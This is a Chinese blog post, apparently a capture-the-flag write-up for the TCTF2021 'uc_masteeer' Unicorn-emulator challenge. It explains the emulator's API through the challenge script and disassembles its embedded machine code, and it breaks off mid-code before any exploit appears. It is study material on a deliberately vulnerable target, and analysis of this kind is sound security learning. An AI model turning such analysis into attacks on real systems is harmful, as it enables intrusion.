<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>TCTF2021-uc_masteeer-WP - blog of chuj</title><link rel=icon type=image/png href=https://chujdk.github.io/favicon.ico><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。
关于 unicorn，在看雪上有一篇 Unicorn 在 Android 的应用 写的很详细，这里参考该文章简单介绍一下。"><meta property="og:image" content><meta property="og:url" content="https://chujdk.github.io/wp/1515.html"><meta property="og:site_name" content="blog of chuj"><meta property="og:title" content="TCTF2021-uc_masteeer-WP"><meta property="og:description" content="一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。
关于 unicorn，在看雪上有一篇 Unicorn 在 Android 的应用 写的很详细，这里参考该文章简单介绍一下。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-04T12:24:00+00:00"><meta property="article:modified_time" content="2021-08-04T12:24:00+00:00"><meta property="article:tag" content="Write-Up"><meta name=twitter:card content="summary"><meta name=twitter:title content="TCTF2021-uc_masteeer-WP"><meta name=twitter:description content="一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。
关于 unicorn，在看雪上有一篇 Unicorn 在 Android 的应用 写的很详细，这里参考该文章简单介绍一下。"><script src=https://chujdk.github.io/js/feather.min.js></script><link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.d24d3471089d3a4f095edc4a6857e25a9f1c6dd3e7d17026141ccad319438873.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>TCTF2021-uc_masteeer-WP</h1><div class=meta>Posted on Aug 4, 2021</div></div><section class=body><p>一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。</p><p>关于 unicorn，在看雪上有一篇 <a href=https://bbs.pediy.com/thread-253868.htm>Unicorn 在 Android 的应用</a> 写的很详细，这里参考该文章简单介绍一下。</p><p>Unicorn 是一个基于 qemu 的代码模拟执行框架，有许多优点，这里不多说。根据 unicorn 提供的 python 接口这里简单分析一下此题提供的 python 脚本的。</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span></code></pre></div><p>这一句导入了 unicorn 库</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.x86_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span></code></pre></div><p>这一句导入了 x86 架构相关的一些常量，比如寄存器常量，命名规则为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>UC_ <span style=color:#666>+</span> <span>指令集</span> <span style=color:#666>+</span> _REG_ <span style=color:#666>+</span> <span>大写寄存器名（</span>UC_X86_REG_EAX<span>，</span>UC_X86_REG_RAX<span>）</span>
</span></span></code></pre></div><p>每个架构都有对应的常量库</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.arm_const</span>  <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.arm64_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.m68k_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.mips_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.sparc_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>unicorn.x86_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span></code></pre></div><p>此脚本的主逻辑在 play 函数中</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>play</span>():
</span></span><span style=display:flex><span>    uc <span style=color:#666>=</span> Uc(UC_ARCH_X86, UC_MODE_64)
</span></span><span style=display:flex><span>    init(uc)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data <span style=color:#666>=</span> os<span style=color:#666>.</span>read(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x1000</span> <span style=color:#666>-</span> <span style=color:#40a070>0xd</span>)
</span></span><span style=display:flex><span>    data <span style=color:#666>+=</span> <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>, data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        uc<span style=color:#666>.</span>emu_start(CODE, CODE <span style=color:#666>+</span> <span style=color:#40a070>0x3000</span> <span style=color:#666>-</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span> UcError <span style=color:#007020;font-weight:700>as</span> e:
</span></span><span style=display:flex><span>        <span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;error...&#34;</span>)
</span></span></code></pre></div><p>开头创建了一个 Uc 类变量 uc，并以 <code>Uc(UC_ARCH_X86, UC_MODE_64)</code> 初始化，这样就获得了一台 x86 架构的虚拟机，运行模式为 64 位。自然，如果需要 32 位的虚拟机，就可以用 <code>UC_MODE_32</code> 初始化。如果需要 arm 架构，就可以用 <code>Uc(UC_ARCH_ARM, UC_MODE_ARM)</code> 初始化。同时，在虚拟机执行的过程中，也有特殊的指令可以修改 mode。</p><p>然后进入 init 函数对 uc 进行了一些初始化</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>init</span>(uc):
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>global</span> writable
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>safe_mem_write <span style=color:#666>=</span> types<span style=color:#666>.</span>MethodType(_safe_mem_write, uc)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_map(CODE, <span style=color:#40a070>0x1000</span>, UC_PROT_READ <span style=color:#666>|</span> UC_PROT_EXEC)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE, <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x90</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x1000</span>)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_map(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>, <span style=color:#40a070>0x1000</span>, UC_PROT_ALL)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>, <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x90</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x1000</span>)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_map(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x2000</span>, <span style=color:#40a070>0x1000</span>, UC_PROT_READ <span style=color:#666>|</span> UC_PROT_EXEC)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x2000</span>, <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x90</span><span style=color:#4070a0>&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x1000</span>)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE, MAIN)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x2000</span>, TAIL)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_write(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x800</span>, p64(CODE <span style=color:#666>+</span> <span style=color:#40a070>0xff0</span>) <span style=color:#666>+</span> p64(CODE <span style=color:#666>+</span> <span style=color:#40a070>0x2000</span>) <span style=color:#666>+</span> p64(CODE))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>mem_map(STACK, <span style=color:#40a070>0x1000</span>, UC_PROT_READ <span style=color:#666>|</span> UC_PROT_WRITE)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>reg_write(UC_X86_REG_RSP, STACK <span style=color:#666>+</span> <span style=color:#40a070>0xf00</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    writable <span style=color:#666>=</span> (CODE <span style=color:#666>+</span> <span style=color:#40a070>0x1000</span>, STACK)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>hook_add(UC_HOOK_INSN, hook_syscall, <span style=color:#007020;font-weight:700>None</span>, <span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>, UC_X86_INS_SYSCALL) 
</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic># 所有的系统调用都由 hook_syscall 接管</span>
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>hook_add(UC_HOOK_CODE, admin_hook, <span style=color:#007020;font-weight:700>None</span>, admin_offset, admin_offset <span style=color:#666>+</span> <span style=color:#40a070>1</span>)
</span></span><span style=display:flex><span>    uc<span style=color:#666>.</span>hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)
</span></span></code></pre></div><p>这里主要做的就是虚拟地址的初始化和 hook。</p><p>uc 虚拟机需要有一段自己的虚拟地址空间才能存储数据运行，通过 <code>mem_map</code> 方法可以新映射一段虚拟地址段。通过 <code>mem_write</code> 方法可以向虚拟地址中写入数据。</p><p>而 <code>hook_add</code> 方法可以实现指令级的 hook。看名字大概就可以理解意思。</p><p>可以看出在这段代码中向虚拟内存中写入了一些机器码，这些机器码是硬编码的。可以用 keystone 把机器码转成汇编，比如这样</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>capstone</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>capstone.x86_const</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>MAIN <span style=color:#666>=</span> <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x48\x83\xec\x20\x66\xc7\x44\x24\x0e\x00\x00\x48\x8d\x5c\x24\x0e\x48\xc7\x44\x24\x10\x00\x00\x00\x00\x48\xc7\x44\x24\x18\x00\x00\x00\x00\xb9\x44\x00\x00\x00\x48\x8d\x15\x8b\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xbe\x01\x00\x00\xb9\x02\x00\x00\x00\x48\x89\xda\x31\xf6\x31\xff\x31\xc0\xe8\xab\x01\x00\x00\x8a\x44\x24\x0e\x3c\x32\x74\x39\x3c\x33\x74\x62\x3c\x31\x0f\x85\x04\x01\x00\x00\xb9\x12\x00\x00\x00\x48\x8d\x15\x35\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x7a\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x12\x00\x00\x00\x48\x8d\x15\xf6\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x4d\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x07\x00\x00\x00\x48\x8d\x15\xc2\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x20\x01\x00\x00\x31\xf6\x31\xff\x48\x8d\x54\x24\x10\xb9\x08\x00\x00\x00\x31\xc0\xe8\x0b\x01\x00\x00\xb9\x07\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\x48\x8d\x15\x82\x00\x00\x00\xbf\x01\x00\x00\x00\xe8\xee\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x18\xb9\x08\x00\x00\x00\xe8\xd9\x00\x00\x00\x48\x81\x7c\x24\x18\xff\x00\x00\x00\x0f\x87\xef\xfe\xff\xff\xb9\x07\x00\x00\x00\x48\x8d\x15\x41\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xad\x00\x00\x00\x48\x8b\x4c\x24\x18\x31\xf6\x31\xff\x48\x8b\x54\x24\x10\x31\xc0\xe8\x98\x00\x00\x00\xe9\xb8\xfe\xff\xff\xbe\xff\x00\x00\x00\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x82\x00\x00\x00\xe9\xa2\xfe\xff\xff\x64\x61\x74\x61\x3a\x20\x00\x73\x69\x7a\x65\x3a\x20\x00\x61\x64\x64\x72\x3a\x20\x00\x50\x61\x74\x68\x65\x74\x69\x63\x20\x68\x75\x6d\x61\x6e\x20\x3e\x0a\x00\x50\x6f\x77\x65\x72\x66\x75\x6c\x20\x61\x64\x6d\x69\x6e\x20\x3e\x0a\x00\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x75\x63\x5f\x6d\x61\x73\x74\x65\x65\x65\x72\x0a\x31\x2e\x20\x61\x64\x6d\x69\x6e\x20\x74\x65\x73\x74\x0a\x32\x2e\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x0a\x33\x2e\x20\x70\x61\x74\x63\x68\x20\x64\x61\x74\x61\x0a\x3f\x3a\x20\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>TAIL <span style=color:#666>=</span> <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x31\xc0\xb9\x32\x00\x00\x00\x48\x8d\x15\x55\x00\x00\x00\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x18\x66\x89\x44\x24\x0e\x31\xc0\xe8\x6d\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x0e\xb9\x02\x00\x00\x00\xe8\x58\x00\x00\x00\x80\x7c\x24\x0e\x79\x75\x11\x48\x83\xc4\x18\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x10\x31\xf6\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x32\x00\x00\x00\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x21\x20\x54\x65\x73\x74\x20\x73\x75\x63\x63\x65\x65\x64\x21\x0a\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x3f\x20\x28\x79\x2f\x5b\x6e\x5d\x29\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>ADMIN <span style=color:#666>=</span> <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3</span><span style=color:#4070a0>&#39;</span><span style=color:#666>.</span>ljust(<span style=color:#40a070>0x1000</span>, <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\xf4</span><span style=color:#4070a0>&#39;</span>)
</span></span><span style=display:flex><span>ATTACH <span style=color:#666>=</span> <span style=color:#4070a0>b</span><span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08</span><span style=color:#4070a0>&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>md <span style=color:#666>=</span> Cs(CS_ARCH_X86, CS_MODE_64)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;main:&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> md<span style=color:#666>.</span>disasm(MAIN, <span style=color:#40a070>0x1000</span>):
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%x</span><span style=color:#4070a0>:</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> (i<span style=color:#666>.</span>address, i<span style=color:#666>.</span>mnemonic, i<span style=color:#666>.</span>op_str))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;tail:&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> md<span style=color:#666>.</span>disasm(TAIL, <span style=color:#40a070>0x3000</span>):
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%x</span><span style=color:#4070a0>:</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> (i<span style=color:#666>.</span>address, i<span style=color:#666>.</span>mnemonic, i<span style=color:#666>.</span>op_str))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;admin:&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> md<span style=color:#666>.</span>disasm(ADMIN, <span style=color:#40a070>0x1000</span>):
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%x</span><span style=color:#4070a0>:</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> (i<span style=color:#666>.</span>address, i<span style=color:#666>.</span>mnemonic, i<span style=color:#666>.</span>op_str))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;attach:&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> md<span style=color:#666>.</span>disasm(ATTACH, <span style=color:#40a070>0x1000</span>):
</span></span><span style=display:flex><span>    <span style=color:#007020>print</span>(<span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%x</span><span style=color:#4070a0>:</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#70a0d0>%s</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>%</span> (i<span style=color:#666>.</span>address, i<span style=color:#666>.</span>mnemonic, i<span style=color:#666>.</span>op_str))
</span></span></code></pre></div><p>但是看汇编会比较痛苦，所以随便写了个程序把机器码写到了一个文件里，用 IDA 分析</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/syscall.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/types.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;elf.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#007020>#define ELF_ENTRY 0xDEADBEEF000
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>char</span> PADDING[<span style=color:#40a070>0x1000</span>];
</span></span><span style=display:flex><span><span style=color:#902000>char</span> MAIN_CODE[] <span style=color:#666>=</span> <span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\x48\x83\xec\x20\x66\xc7\x44\x24\x0e\x00\x00\x48\x8d\x5c\x24\x0e\x48\xc7\x44\x24\x10\x00\x00\x00\x00\x48\xc7\x44\x24\x18\x00\x00\x00\x00\xb9\x44\x00\x00\x00\x48\x8d\x15\x8b\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xbe\x01\x00\x00\xb9\x02\x00\x00\x00\x48\x89\xda\x31\xf6\x31\xff\x31\xc0\xe8\xab\x01\x00\x00\x8a\x44\x24\x0e\x3c\x32\x74\x39\x3c\x33\x74\x62\x3c\x31\x0f\x85\x04\x01\x00\x00\xb9\x12\x00\x00\x00\x48\x8d\x15\x35\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x7a\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x12\x00\x00\x00\x48\x8d\x15\xf6\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x4d\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x07\x00\x00\x00\x48\x8d\x15\xc2\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x20\x01\x00\x00\x31\xf6\x31\xff\x48\x8d\x54\x24\x10\xb9\x08\x00\x00\x00\x31\xc0\xe8\x0b\x01\x00\x00\xb9\x07\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\x48\x8d\x15\x82\x00\x00\x00\xbf\x01\x00\x00\x00\xe8\xee\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x18\xb9\x08\x00\x00\x00\xe8\xd9\x00\x00\x00\x48\x81\x7c\x24\x18\xff\x00\x00\x00\x0f\x87\xef\xfe\xff\xff\xb9\x07\x00\x00\x00\x48\x8d\x15\x41\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xad\x00\x00\x00\x48\x8b\x4c\x24\x18\x31\xf6\x31\xff\x48\x8b\x54\x24\x10\x31\xc0\xe8\x98\x00\x00\x00\xe9\xb8\xfe\xff\xff\xbe\xff\x00\x00\x00\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x82\x00\x00\x00\xe9\xa2\xfe\xff\xff\x64\x61\x74\x61\x3a\x20\x00\x73\x69\x7a\x65\x3a\x20\x00\x61\x64\x64\x72\x3a\x20\x00\x50\x61\x74\x68\x65\x74\x69\x63\x20\x68\x75\x6d\x61\x6e\x20\x3e\x0a\x00\x50\x6f\x77\x65\x72\x66\x75\x6c\x20\x61\x64\x6d\x69\x6e\x20\x3e\x0a\x00\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x75\x63\x5f\x6d\x61\x73\x74\x65\x65\x65\x72\x0a\x31\x2e\x20\x61\x64\x6d\x69\x6e\x20\x74\x65\x73\x74\x0a\x32\x2e\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x0a\x33\x2e\x20\x70\x61\x74\x63\x68\x20\x64\x61\x74\x61\x0a\x3f\x3a\x20\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3</span><span style=color:#4070a0>&#34;</span>;
